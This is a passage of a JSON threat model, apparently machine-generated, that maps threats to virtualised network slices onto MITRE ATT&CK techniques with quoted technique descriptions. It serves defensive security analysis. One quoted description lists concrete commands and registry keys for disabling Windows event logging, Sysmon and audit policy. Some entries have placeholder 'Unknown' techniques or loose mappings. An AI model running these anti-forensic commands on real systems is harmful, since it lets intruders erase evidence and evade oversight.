this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof legitimate service provider interfaces to intercept sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces are not sufficiently secured.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of encryption or weak encryption on external interfaces."
                },
                {
                    "Assumption": "The attacker possesses or can obtain service provider credentials.",
                    "Role": "Attacker",
                    "Condition": "Compromised service provider credentials or weak authentication."
                },
                {
                    "Assumption": "Service provider interfaces do not employ mutual authentication.",
                    "Role": "Network Administrator",
                    "Condition": "Improper configuration of mutual authentication protocols."
                }
            ],
            "Potential Impact": "Interception of sensitive data, leading to confidentiality breaches and potential tampering.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "external interfaces",
                "service provider",
                "intercept data"
            ],
            "mitre_technique": {
                "name": "Trusted Relationship",
                "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
                "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
                "technique_id": "T1199"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers could spoof DNS responses to direct traffic to malicious servers.",
            "Assumptions": [
                {
                    "Assumption": "Internal DNS traffic is not secured or monitored.",
                    "Role": "Network Administrator",
                    "Condition": "Unprotected DNS traffic within the network."
                },
                {
                    "Assumption": "The attacker can respond to DNS requests faster than legitimate servers.",
                    "Role": "Attacker",
                    "Condition": "Ability to intercept DNS requests and craft responses."
                },
                {
                    "Assumption": "DNS responses are not validated against known safe records.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of DNSSEC or other validation mechanisms."
                }
            ],
            "Potential Impact": "User redirection to malicious servers, potential data theft, and network disruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "DNS",
                "malicious servers",
                "user redirection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with configuration files of Virtual Network Functions (VNFs).",
            "Assumptions": [
                {
                    "Assumption": "Unauthorized access to the system that stores or manages configuration files.",
                    "Role": "Attacker",
                    "Condition": "Weak or compromised access controls on configuration management systems."
                },
                {
                    "Assumption": "Lack of integrity verification mechanisms for configuration files.",
                    "Role": "Network Administrator",
                    "Condition": "Absence of file integrity monitoring and checksums."
                },
                {
                    "Assumption": "Configuration management interfaces are exposed and not adequately secured.",
                    "Role": "Network Administrator",
                    "Condition": "Misconfigured or unprotected configuration management interfaces."
                }
            ],
            "Potential Impact": "Corruption of network slice configurations leading to service disruptions and integrity breaches.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration files",
                "virtual network functions",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could modify orchestration commands to affect the lifecycle management of network slices.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration commands are not authenticated or validated.",
                    "Role": "Network Administrator",
                    "Condition": "Absence or weakness in command authentication and validation."
                },
                {
                    "Assumption": "The attacker has network access to the orchestration and management layer.",
                    "Role": "Attacker",
                    "Condition": "Compromised network access or credentials."
                },
                {
                    "Assumption": "Insufficient monitoring of orchestration activities.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of comprehensive audit logging and anomaly detection."
                }
            ],
            "Potential Impact": "Unauthorized changes to network slices, potentially leading to service loss and reduced availability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "orchestration commands",
                "network slices",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with data in transit between edge and cloud computing nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted or uses weak encryption.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of or improperly configured data encryption policies."
                },
                {
                    "Assumption": "The attacker has access to network links or intermediate nodes.",
                    "Role": "Attacker",
                    "Condition": "Compromised network infrastructure or man-in-the-middle access."
                },
                {
                    "Assumption": "Lack of integrity checks for data passing through the network.",
                    "Role": "Network Administrator",
                    "Condition": "Absence of integrity validation mechanisms such as checksums or hashes."
                }
            ],
            "Potential Impact": "Compromised data integrity and potential loss of confidentiality, leading to service disruptions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data in transit",
                "edge computing",
                "cloud computing"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious actor could perform actions on the network without detection, leading to repudiation issues.",
            "Assumptions": [
                {
                    "Assumption": "Lack of or insufficient logging and auditing mechanisms.",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate or absent logging of critical actions and events."
                },
                {
                    "Assumption": "Logs can be easily forged or altered.",
                    "Role": "Attacker",
                    "Condition": "Weak log integrity and protection mechanisms."
                },
                {
                    "Assumption": "Actions are not correlated with authenticated identities.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of user activity tracking and correlation with authentication logs."
                }
            ],
            "Potential Impact": "Inability to attribute actions to users, leading to difficulties in forensic investigations and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "auditing",
                "forensic investigations"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider could alter network slice configurations and deny making changes.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not logged or monitored in real-time.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of real-time change monitoring and logging."
                },
                {
                    "Assumption": "No mechanism to enforce change approvals and documentation.",
                    "Role": "Network Administrator",
                    "Condition": "Absence of robust change management processes and approval workflows."
                },
                {
                    "Assumption": "Configuration management interfaces lack sufficient access controls.",
                    "Role": "Network Administrator",
                    "Condition": "Misconfigured or inadequate access control mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized and untraceable changes to critical configurations, compromising service integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "network slice configurations",
                "insider threat",
                "unauthorized changes"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could use compromised credentials to execute unauthorized commands and deny involvement.",
            "Assumptions": [
                {
                    "Assumption": "System lacks robust authentication mechanisms.",
                    "Role": "Network Administrator",
                    "Condition": "Weak or absent multi-factor authentication (MFA) mechanisms."
                },
                {
                    "Assumption": "Compromised credentials are not detected quickly.",
                    "Role": "Network Security Team",
                    "Condition": "Ineffective monitoring and alerting of credential misuse."
                },
                {
                    "Assumption": "Commands executed are not traceable to a unique user.",
                    "Role": "Network Administrator",
                    "Condition": "Commands are not logged or lack identifying information."
                }
            ],
            "Potential Impact": "Unauthorized actions with no user accountability, jeopardizing security and legal compliance.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "compromised credentials",
                "authentication",
                "unauthorized commands"
            ],
            "mitre_technique": {
                "name": "Application Access Token",
                "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
                "id": "attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a",
                "technique_id": "T1527"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data could be intercepted from unencrypted communication channels between network functions.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels between network functions are not encrypted.",
                    "Role": "Network Administrator",
                    "Condition": "Unencrypted or weakly encrypted data transmission."
                },
                {
                    "Assumption": "Attacker has access to the communication paths.",
                    "Role": "Attacker",
                    "Condition": "Compromised network infrastructure or man-in-the-middle access."
                },
                {
                    "Assumption": "Lack of monitoring for unusual data access patterns.",
                    "Role": "Network Security Team",
                    "Condition": "Absence of anomaly detection in network traffic monitoring."
                }
            ],
            "Potential Impact": "Compromise of data confidentiality and exposure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unencrypted communication",
                "network functions",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could exploit weak access controls to access sensitive data stored in VNFs.",
            "Assumptions": [
                {
                    "Assumption": "Access controls on VNF data storage are improperly configured.",
                    "Role": "Network Administrator",
                    "Condition": "Misconfigured or weak access control policies."
                },
                {
                    "Assumption": "The attacker can bypass authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Exploitation of vulnerabilities allowing bypass of authentication."
                },
                {
                    "Assumption": "Access attempts are not sufficiently monitored or logged.",
                    "Role": "Network Security Team",
                    "Condition": "Lack of comprehensive monitoring and logging for access attempts."
                }
            ],
            "Potential Impact": "Unauthorized access to and potential theft of sensitive data, compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "access controls",
                "virtual network functions",
                "data theft"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "External interface vulnerabilities could be exploited to expose sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces lack sufficient security measures.",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate or absent security controls on external interfaces."
                },
                {
                    "Assumption": "The attacker can discover and exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Detailed knowledge of the system and its vulnerabilities."
                },
                {
                    "Assumption": "Lack of regular security assessments and patching.",
                    "Role": "Network Security Team",
                    "Condition": "Infrequent or insufficient vulnerability scanning and patch management."
                }
            ],
            "Potential Impact": "Exposure and unauthorized access to sensitive data through compromised external interfaces.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "external interfaces",
                "vulnerabilities",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could launch a DDoS attack on network slices, overwhelming the system and causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "The network infrastructure lacks adequate DDoS protection mechanisms.",
                    "Role": "Network Administrator",
                    "Condition": "Insufficient DDoS mitigation strategies and tools."
                },
                {
                    "Assumption": "An attacker can coordinate multiple sources to generate overwhelming traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to a botnet or similar resources to launch DDoS attacks."
                },
                {
                    "Assumption": "The system does not effectively throttle or filter large amounts of traffic.",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate traffic management and filtering mechanisms."
                }
            ],
            "Potential Impact": "Significant service disruption and loss of availability for one or more network slices.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network slices",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could exploit a vulnerability in the orchestration layer to cause a system crash.",
            "Assumptions": [
                {
                    "Assumption": "The orchestration layer has unpatched or zero-day vulnerabilities.",
                    "Role": "Network Administrator",
                    "Condition": "Insufficient patch management and vulnerability assessments."
                },
                {
                    "Assumption": "The attacker has knowledge of the orchestration system and its vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Access to insider information or exploit toolkits."
                },
                {
                    "Assumption": "There are no effective measures to detect and mitigate exploitation attempts.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of intrusion detection and prevention systems."
                }
            ],
            "Potential Impact": "Crashed orchestration services leading to a halt in network slice management and overall service disruption.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "orchestration layer",
                "vulnerabilities",
                "system crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could flood the VNFs with excessive requests, exhausting resources and causing service downtime.",
            "Assumptions": [
                {
                    "Assumption": "The VNFs do not have rate limiting or resource throttling mechanisms in place.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of sufficient request rate limiting and throttling policies."
                },
                {
                    "Assumption": "The attacker can generate a significant number of requests quickly.",
                    "Role": "Attacker",
                    "Condition": "Access to tools or botnets capable of generating high request volumes."
                },
                {
                    "Assumption": "The system lacks adequate monitoring to detect and respond to such flooding attacks.",
                    "Role": "Network Security Team",
                    "Condition": "Absence of real-time monitoring and automated response mechanisms."
                }
            ],
            "Potential Impact": "Resource exhaustion and downtime for affected VNFs, impacting service availability and performance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "virtual network functions",
                "resource exhaustion",
                "service downtime"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
